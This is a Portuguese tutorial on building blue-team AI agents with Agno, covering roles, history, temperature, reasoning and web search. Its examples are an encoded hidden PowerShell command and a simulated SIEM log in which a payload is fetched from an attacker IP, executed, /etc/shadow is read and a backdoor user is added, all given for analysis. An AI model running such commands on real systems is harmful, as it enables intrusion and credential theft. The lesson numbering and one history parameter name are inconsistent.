# 🛡️ Agentes de IA para Blue Teams — Dia 2: Chat, Roles, Temperatura, Thinking e Search

> **Duração estimada:** ~1 hora  
> **Pré-requisito:** Dias 1 e 2 concluídos  
> **Objetivo:** Entender os papéis das mensagens, controlar o comportamento do modelo com temperatura, explorar thinking e search — tudo com Agno

---

## 📋 O que vamos fazer hoje

1. Entender `system`, `user` e `assistant` — o que são por baixo
2. Construir um chat interativo com Agno
3. Controlar a criatividade com temperatura
4. Explorar o modo thinking (raciocínio)
5. Usar web search integrado

---

## 1. Os Três Papéis (Roles) — O que Acontece por Baixo

Toda conversa com um LLM é, na verdade, uma lista de mensagens com papéis definidos. Mesmo quando você usa o Agno — ou o ChatGPT — isso está acontecendo por baixo dos panos.

### `system` — O Diretor

Define o **comportamento, personalidade e restrições** do modelo. É como um briefing que o modelo recebe antes da conversa começar. No Agno, isso é o parâmetro `description` e `instructions`.

```
Analogia: É o manual de conduta que o analista recebe no primeiro dia de trabalho.
```

```python
# Como fica por baixo (SDK puro):
{"role": "system", "content": "Você é um analista de segurança sênior..."}

# Como você escreve no Agno:
Agent(
    description="Você é um analista de segurança sênior...",
    instructions=["Classifique sempre a severidade", "Seja técnico e objetivo"],
)
```

### `user` — Quem Pergunta

Representa as mensagens do **usuário humano**. No Agno, é o que você passa para `print_response()` ou `run()`.

```python
# Por baixo:
{"role": "user", "content": "Recebi um alerta de SSH às 3h da manhã. O que verificar?"}

# No Agno:
agente.print_response("Recebi um alerta de SSH às 3h da manhã. O que verificar?")
```

### `assistant` — O Modelo

Representa as **respostas anteriores** do modelo. Quando mantemos histórico de conversa, as respostas anteriores precisam ser incluídas como mensagens `assistant` em cada nova chamada — para que o modelo "lembre" o que disse.

```python
# Por baixo, a lista fica assim ao longo do chat:
[
    {"role": "system",    "content": "Você é analista de segurança..."},
    {"role": "user",      "content": "Alerta de SSH às 3h"},
    {"role": "assistant", "content": "Verifique /var/log/auth.log..."},
    {"role": "user",      "content": "Encontrei 50 tentativas falhas"},
    {"role": "assistant", "content": "Bloqueie o IP e inicie o IR..."},
]
# ↑ Toda essa lista é enviada em CADA nova chamada à API
```

**O Agno gerencia esse array automaticamente.** Você não precisa fazer isso manualmente.

---

## 2. Chat Interativo com Agno

### O problema do "amnésico" — e como o Agno resolve

Sem persistência, cada chamada começa do zero. O Agno resolve isso com o parâmetro `add_history_to_messages`:

```python
# chat.py
from agno.agent import Agent
from agno.models.openai import OpenAIChat

agente = Agent(
    model=OpenAIChat(id="gpt-5.4-mini"),
    description="""Você é um analista de segurança especializado em blue team.
    Sempre estruture sua resposta com:
    1. Severidade: CRÍTICO | ALTO | MÉDIO | BAIXO
    2. Análise
    3. Ações recomendadas""",
    num_history_sessions=10,       # ← quantas trocas lembrar
    markdown=True,
)

# Chat interativo no terminal — o Agno cuida do loop e do histórico
agente.cli_app(markdown=True)
```

```bash
uv run python chat.py
```

**Testando a memória:**
```
Você: Recebi um alerta de login SSH de root às 3h da manhã de um IP russo.

Agente:
Severidade: CRÍTICO
Análise: Acesso root via SSH fora do horário...
Ações: 1. Isole o sistema...

Você: Quais logs devo preservar para a análise forense?

Agente:
Considerando o incidente que você descreveu [lembra do contexto!]...
Os logs prioritários são: /var/log/auth.log, /var/log/syslog...
```

---

## 3. Temperatura — Controlando a Criatividade

### O que é temperatura?

A temperatura controla o **grau de aleatoriedade** nas respostas do modelo.

- **Temperatura 0.0** → Determinístico, sempre a resposta "mais provável"
- **Temperatura 1.0** → Equilibrado, variado mas coerente
- **Temperatura 2.0** → Muito criativo / caótico (não recomendado)

### Analogia

Imagine que o modelo está escolhendo a próxima palavra numa lista de candidatos com probabilidades:

```
"O sistema está..." 
→ "comprometido" (60%) | "vulnerável" (25%) | "funcionando" (15%)

Temperatura 0.0 → sempre escolhe "comprometido"
Temperatura 0.7 → às vezes "comprometido", às vezes "vulnerável"
Temperatura 1.5 → pode escolher qualquer um, mesmo os improváveis
```

### Quando usar cada valor

| Temperatura | Valor | Quando usar |
|-------------|-------|-------------|
| Baixa | 0.0 – 0.3 | Análise técnica, classificação, código, relatórios |
| Média | 0.5 – 0.7 | Explicações, resumos, conversas |
| Alta | 0.8 – 1.2 | Brainstorming, geração de cenários, conteúdo criativo |

### Como configurar no Agno

```python
from agno.agent import Agent
from agno.models.openai import OpenAIChat

# ✅ Triagem de comandos — temperatura baixa para classificação consistente
agente_analise = Agent(
    model=OpenAIChat(id="gpt-5.4", temperature=0.1),
    description="""Analista de SOC. Classifique a linha de comando como
    BENIGNO | SUSPEITO | MALICIOSO e explique em uma frase o motivo.""",
)

comando = (
    "powershell -nop -w hidden -enc "
    "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQ..."
)

# Rodamos o MESMO prompt 3 vezes para ver o efeito da temperatura baixa:
# a classificação se mantém estável a cada execução.
for i in range(3):
    print(f"\n--- Execução {i + 1} ---")
    agente_analise.print_response(
        f"Classifique esta linha de comando capturada no endpoint:\n{comando}"
    )

# ✅ Tabletop exercises — temperatura alta para gerar cenários variados
agente_tabletop = Agent(
    model=OpenAIChat(id="gpt-5.4", temperature=0.9),
    description="Especialista em exercícios de segurança.",
)

agente_tabletop.print_response(
    "Crie 3 cenários de ataque realistas e diferentes para um tabletop exercise de ransomware."
)
```

> 💡 **Por que rodar 3x no primeiro exemplo?** Com `temperature=0.1`, as três execuções
> devolvem essencialmente a mesma classificação e justificativa — é isso que queremos em
> triagem: resultado **reproduzível**. Troque para `temperature=0.9` e rode de novo: as
> respostas começam a variar no texto. É o mesmo efeito que torna o agente de tabletop
> (acima) interessante — só que ali a variação é desejável, e aqui é um problema.

---

## 4. Modo Thinking — Raciocínio Explícito

### O que é?

Os modelos mais avançados (como `gpt-5.4` e `gpt-5.5`) têm capacidade de **thinking** — antes de responder, o modelo "pensa" internamente, decomposição o problema em etapas, verifica hipóteses, e só então gera a resposta final.

No Agno, isso é controlado via `reasoning=True`:

**Benefícios:**
- Respostas muito mais precisas em problemas complexos
- Menos alucinações em análises técnicas
- Melhor para decisões com múltiplas variáveis

**Trade-offs:**
- Mais lento (segundos a minutos)
- Mais caro (você paga pelos tokens de "pensamento")

### Quando usar em segurança

| Tarefa | Modelo + Config |
|--------|----------------|
| Triagem de 1000 alertas | `gpt-5.4-mini`, reasoning=False |
| Análise de log complexo | `gpt-5.4`, reasoning=False |
| Decidir se sistema deve ser isolado | `gpt-5.4`, reasoning=True |
| Investigar cadeia de ataque completa | `gpt-5.5`, reasoning=True |

### Exemplo com thinking

```python
# thinking.py
from agno.agent import Agent
from agno.models.openai import OpenAIChat

agente = Agent(
    model=OpenAIChat(id="gpt-5.4"),
    description="Analista forense digital especializado em resposta a incidentes.",
    instructions=[
        "Analise cada evidência individualmente antes de correlacionar",
        "Considere hipóteses alternativas antes de concluir",
        "Indique o nível de confiança: ALTO | MÉDIO | BAIXO",
    ],
    reasoning=True,   # ← ativa raciocínio passo a passo
    markdown=True,
)

cenario = """
Eventos no SIEM — Servidor prod-01:

03:14 - SSH login bem-sucedido: root de 185.220.101.45 (RU)
03:17 - wget http://185.220.101.45/update.sh -O /tmp/.update
03:18 - chmod +x /tmp/.update && /tmp/.update
03:19 - Conexão TCP de saída: 185.220.101.45:4444 (persistente)
03:21 - Leitura: /etc/shadow, /etc/passwd
03:25 - useradd -m -s /bin/bash svc_monitor
03:28 - Varredura interna: 192.168.10.0/24 porta 22
"""

agente.print_response(
    f"Analise esta sequência de eventos:\n{cenario}\n\n"
    "Determine: qual é a cadeia de ataque? Qual o nível de comprometimento? "
    "Quais ações imediatas tomar?",
    stream=True,
)
```

---

## 5. Web Search — Modelo com Acesso à Internet

### O que é?

O Agno permite adicionar busca na web como uma **tool** do agente. Isso resolve o problema do **knowledge cutoff** — o modelo não sabe sobre CVEs lançadas ontem, mas com search, sabe.

**Quando é crítico em segurança:**
- CVEs e vulnerabilidades recentes
- Status de IOCs (IPs, domínios, hashes) em tempo real
- Notícias sobre grupos de ameaça ativos

```python
# search_agent.py
from agno.agent import Agent
from agno.models.openai import OpenAIChat
from agno.tools.websearch import WebSearchTools

agente = Agent(
    model=OpenAIChat(id="gpt-5.4-mini"),
    description="Analista de threat intelligence com acesso à internet.",
    instructions=[
        "Sempre busque informações atualizadas antes de responder",
        "Cite as fontes encontradas",
        "Foque em fontes confiáveis: NIST, MITRE, CVE.org, Bleeping Computer",
    ],
    tools=[WebSearchTools()],  # ← adiciona capacidade de busca
    markdown=True,
)

agente.print_response(
    "Quais CVEs críticas (CVSS >= 9.0) foram divulgadas nos últimos 60 dias "
    "que afetam servidores Linux? Liste CVE ID, descrição e sistemas afetados.",
    stream=True,
)
```

**O agente vai:**
1. Decidir que precisa buscar informações atuais
2. Executar buscas no DuckDuckGo automaticamente
3. Sintetizar os resultados e responder com base neles

---

## 6. Chat Completo com Todas as Features

```python
# chat_completo.py
from agno.agent import Agent
from agno.models.openai import OpenAIChat
from agno.tools.websearch import WebSearchTools

agente = Agent(
    name="Blue Team Assistant",
    model=OpenAIChat(id="gpt-5.4", temperature=0.2),
    description="Analista de segurança sênior especializado em blue team.",
    instructions=[
        "Classifique sempre a severidade: CRÍTICO | ALTO | MÉDIO | BAIXO",
        "Seja técnico, objetivo e acionável",
        "Quando precisar de informações atuais sobre CVEs ou IOCs, use a busca",
    ],
    tools=[WebSearchTools()],
    num_history_sessions=10,
    markdown=True,
)

agente.cli_app(markdown=True)
```

---

## ✅ Checklist do Dia 3

- [ ] Entendeu o que são `system`, `user` e `assistant` por baixo dos panos
- [ ] Chat com histórico funcionando via Agno (`add_history_to_messages`)
- [ ] Testou diferentes valores de temperatura e viu a diferença nas respostas
- [ ] Agente com `reasoning=True` funcionando para análise complexa
- [ ] Agente com `WebSearchTools` buscando CVEs em tempo real

---

## 📚 Referências

- [Agno — Agent Basics](https://docs.agno.com/agents/introduction)
- [Agno — Tools](https://docs.agno.com/tools/overview)
- [OpenAI — Modelos e raciocínio](https://platform.openai.com/docs/models)

---

> **Próxima aula (Dia 3):** Prompt Engineering — como construir prompts eficazes, formato de saída estruturado e trabalho com arquivos (txt, PDF, imagem) — tudo com Agno.
